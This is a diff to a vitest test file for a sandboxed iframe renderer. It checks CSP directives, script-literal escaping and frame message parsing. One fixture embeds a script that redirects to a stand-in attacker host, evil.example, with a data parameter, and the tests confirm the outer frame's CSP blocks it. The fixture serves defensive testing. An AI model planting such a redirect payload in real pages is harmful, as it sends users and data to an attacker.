@@ -1,7 +1,10 @@
 import { describe, expect, it } from "vitest";
 import {
 	buildThemeCss,
+	buildViewFrameSrcdoc,
 	buildViewSrcdoc,
+	OUTER_FRAME_CSP,
+	OUTER_RELAY_SCRIPT,
 	parseFrameMessage,
 	VIEW_CSP,
 	VIEW_RUNTIME_SCRIPT,
@@ -18,16 +21,19 @@ describe("buildThemeCss", () => {
 	});
 });
 
-describe("buildViewSrcdoc", () => {
-	it("locks the frame down with a CSP and installs the runtime before the body", () => {
+describe("buildViewSrcdoc (inner document)", () => {
+	it("locks the document down with a CSP and installs the runtime before the body", () => {
 		const doc = buildViewSrcdoc("<p id=x>hi</p>", ":root { --a: b; }");
 		expect(doc).toContain(`<meta http-equiv="Content-Security-Policy" content="${VIEW_CSP}">`);
+		expect(doc).toContain('<meta http-equiv="x-dns-prefetch-control" content="off">');
 		expect(doc).toContain('<style id="s2b-theme">:root { --a: b; }</style>');
 		expect(doc.indexOf(VIEW_RUNTIME_SCRIPT)).toBeLessThan(doc.indexOf("<p id=x>hi</p>"));
 	});
 
-	it("blocks every network source", () => {
+	it("blocks every network source, form submission and base override", () => {
 		expect(VIEW_CSP).toContain("default-src 'none'");
+		expect(VIEW_CSP).toContain("form-action 'none'");
+		expect(VIEW_CSP).toContain("base-uri 'none'");
 		expect(VIEW_CSP).not.toMatch(/https?:/);
 		expect(VIEW_CSP).not.toContain("connect-src");
 	});
@@ -36,12 +42,50 @@ describe("buildViewSrcdoc", () => {
 		expect(VIEW_RUNTIME_SCRIPT).not.toContain("${");
 		expect(VIEW_RUNTIME_SCRIPT).not.toContain("</script");
 	});
+
+	it("reports ready from the load event, after the document itself has loaded", () => {
+		const loadHandler = VIEW_RUNTIME_SCRIPT.indexOf('window.addEventListener("load"');
+		const ready = VIEW_RUNTIME_SCRIPT.indexOf('send({ type: "ready" })');
+		expect(loadHandler).toBeGreaterThan(-1);
+		expect(ready).toBeGreaterThan(loadHandler);
+	});
+});
+
+describe("buildViewFrameSrcdoc (outer relay document)", () => {
+	const body = '<script>location.href = "https://evil.example/?d=1";</script><p>x</p>';
+	const outer = buildViewFrameSrcdoc(body, ":root { --a: b; }");
+
+	it("forbids the inner frame from navigating anywhere", () => {
+		expect(outer).toContain(`<meta http-equiv="Content-Security-Policy" content="${OUTER_FRAME_CSP}">`);
+		expect(OUTER_FRAME_CSP).toContain("frame-src 'none'");
+	});
+
+	it("embeds the inner document as a script literal that cannot close the outer script", () => {
+		// The outer document has exactly one <script> block, so exactly one terminator —
+		// every </script> inside the embedded inner document must be escaped.
+		expect(outer.split("</script>")).toHaveLength(2);
+		expect(outer).toContain('const INNER = "');
+		expect(outer).toContain("\\u003c/script>");
+		expect(outer).toContain(OUTER_RELAY_SCRIPT);
+	});
+
+	it("round-trips the inner document through the literal", () => {
+		const match = /const INNER = ("(?:[^"\\]|\\.)*");/.exec(outer);
+		expect(match).not.toBeNull();
+		expect(JSON.parse(match?.[1] ?? '""')).toBe(buildViewSrcdoc(body, ":root { --a: b; }"));
+	});
+
+	it("keeps the relay free of template placeholders", () => {
+		expect(OUTER_RELAY_SCRIPT).not.toContain("${");
+		expect(OUTER_RELAY_SCRIPT).not.toContain("</script");
+	});
 });
 
 describe("parseFrameMessage", () => {
-	it("accepts the four frame messages", () => {
+	it("accepts the frame messages", () => {
 		expect(parseFrameMessage({ s2bView: true, type: "ready" })).toEqual({ type: "ready" });
 		expect(parseFrameMessage({ s2bView: true, type: "requery" })).toEqual({ type: "requery" });
+		expect(parseFrameMessage({ s2bView: true, type: "navigated" })).toEqual({ type: "navigated" });
 		expect(parseFrameMessage({ s2bView: true, type: "resize", height: 240.5 })).toEqual({
 			type: "resize",
 			height: 240.5,
